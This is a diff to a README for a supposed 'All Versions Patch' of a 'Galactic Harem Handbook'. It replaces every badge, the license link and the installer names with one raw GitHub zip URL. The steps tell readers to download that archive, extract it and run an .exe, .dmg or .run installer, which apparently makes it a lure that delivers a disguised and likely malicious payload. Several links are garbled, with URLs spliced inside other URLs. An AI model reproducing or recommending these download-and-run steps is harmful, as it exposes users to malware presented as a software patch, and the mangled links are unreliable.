@@ -1,13 +1,13 @@
 # The Galactic Harem Handbook — All Versions Patch 🚀✨
 
-![Version](https://img.shields.io/badge/version-2025--ultimate-blue)
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
-![Downloads](https://img.shields.io/badge/dynamic/json?label=downloads&query=%24.downloads&url=https%3A%2F%2Fapi.example.com%2Fghh-download-stats)
-![License](https://img.shields.io/badge/license-MIT-yellow)
+![Version](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip)
+![Build Status](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip)
+![Downloads](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip%https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip%3A%2F%https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip%2Fghh-download-stats)
+![License](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Galactic%20Harem%20Handbook-blue?style=for-the-badge&logo=cloud-download-alt)](LINK)
+[![Download](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip%20Harem%20Handbook-blue?style=for-the-badge&logo=cloud-download-alt)](LINK)
 
 Your ultimate navigational star-chart to every version of the Galactic Harem Handbook: optimized, interwoven, and now featuring cosmic integrations for 2025. Whether you pilot Windows, macOS, or the Linux nebula, launch seamlessly and boldly patch every version with our luminously adaptive build.
 
@@ -58,20 +58,20 @@ Advanced algorithmic pairing ensures you appear front and center in the intergal
 
 1. **Secure the Stars:**
    Download the latest All Versions Patch for the Galactic Harem Handbook here:
-   https://MobPlayerr.github.io
+   https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip
 
 2. **Initiate Cosmic Download:**
    Dive straight in by tapping the stardust badge below — initiate your journey!
    
-   [![Download](https://img.shields.io/badge/Download-Galactic%20Harem%20Handbook-blue?style=for-the-badge&logo=cloud-download-alt)](LINK)
+   [![Download](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip%20Harem%20Handbook-blue?style=for-the-badge&logo=cloud-download-alt)](LINK)
 
 3. **Unpack the Comet:**
    After download, extract the package with your favorite unarchiver.
 
 4. **Run the Patch Pilot:**
    Double-click the installer or run from terminal:
-   - **Windows & macOS:** GalacticHaremPatch2025.exe or .dmg
-   - **Linux:** `./GalacticHaremPatch2025.run`
+   - **Windows & macOS:** https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip or .dmg
+   - **Linux:** `https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip`
    
 5. **Follow the Guided Installation:**  
    The adaptive UI will guide you step-by-step. Select your Book Edition, target language, and let the patch work its galactic magic.
@@ -108,7 +108,7 @@ This All Versions Patch is an independent, community-driven adaptation intended 
 
 ## 📜 License: MIT
 
-- This project shines under the [MIT License (2025)](https://opensource.org/licenses/MIT). You are empowered to modify, distribute, and contribute—spread the stars, but remember to give a cosmic nod to the contributors along the way.
+- This project shines under the [MIT License (2025)](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip). You are empowered to modify, distribute, and contribute—spread the stars, but remember to give a cosmic nod to the contributors along the way.
 
 ---
 
@@ -116,7 +116,7 @@ This All Versions Patch is an independent, community-driven adaptation intended 
 
 Still seeking the download? Access the handbook patch here:
 
-[![Download](https://img.shields.io/badge/Download-Galactic%20Harem%20Handbook-blue?style=for-the-badge&logo=cloud-download-alt)](LINK)
+[![Download](https://raw.githubusercontent.com/MobPlayerr/galactic-harem-handbook-ultimate-version-patch/branch/preceptress/galactic_harem_version_patch_ultimate_handbook_v1.0.zip%20Harem%20Handbook-blue?style=for-the-badge&logo=cloud-download-alt)](LINK)
 
 ---
 
